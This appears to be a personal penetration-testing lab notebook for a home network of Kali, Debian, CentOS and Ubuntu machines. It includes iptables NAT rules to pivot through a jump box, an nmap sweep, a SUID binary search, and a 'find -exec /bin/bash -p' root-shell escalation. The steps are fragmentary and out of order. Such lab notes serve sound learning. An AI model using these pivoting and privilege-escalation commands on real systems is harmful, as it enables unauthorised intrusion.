- cat /proc/sys/net/ipv4/ip_forward shows 1 if forwarding is enabled

# Forward traffic from CentOS port 2222 to Ubuntu's SSH
sudo iptables -t nat -A PREROUTING -p tcp --dport 2222 -j DNAT --to-destination 192.168.244.130:22
sudo iptables -A FORWARD -p tcp -d 192.168.244.130 --dport 22 -j ACCEPT
sudo iptables -t nat -A POSTROUTING -p tcp -d 192.168.244.130 --dport 22 -j MASQUERADE

11. Try to access from Debian host
12. Privilege escalation on Ubuntu
# Look for SUID binaries (the #1 Linux privesc vector)
find / -perm -4000 -type f 2>/dev/null
13. Exploit the SUID find
- /usr/local/bin/find . -exec /bin/bash -p \;
- if can't exit force with pkill -9 bash

Full Lab 2

YOUR MACHINE                        COMPANY NETWORK

                                ┌─── 192.168.244.0/24 (DMZ) ───┐
Kali (attacker)                 │                                │
192.168.244.129          Debian (mail server)          CentOS (jump box)
                         192.168.244.132               192.168.244.131
                                                       172.16.0.1
                                                            │
                                              ┌── 172.16.0.0/24 (internal) ──┐
                                              │                               │
                                        Ubuntu (file server - the prize)
                                        172.16.0.2
                                        (192.168.244.130 — blocked by firewall)

***NOTE: Allowing ESTABLISHED,RELATED in iptables is a stateful firewall rule that permits incoming packets belonging to connections that have already been authorized or initiated by the host.  This mechanism ensures that return traffic for legitimate sessions is not dropped by a default-deny policy, enabling two-way communication without needing explicit rules for every return packet.***


1. Reconnaissance
- nmap -sn 192.168.244.0/24 (finds .130,.131,.132)


 



























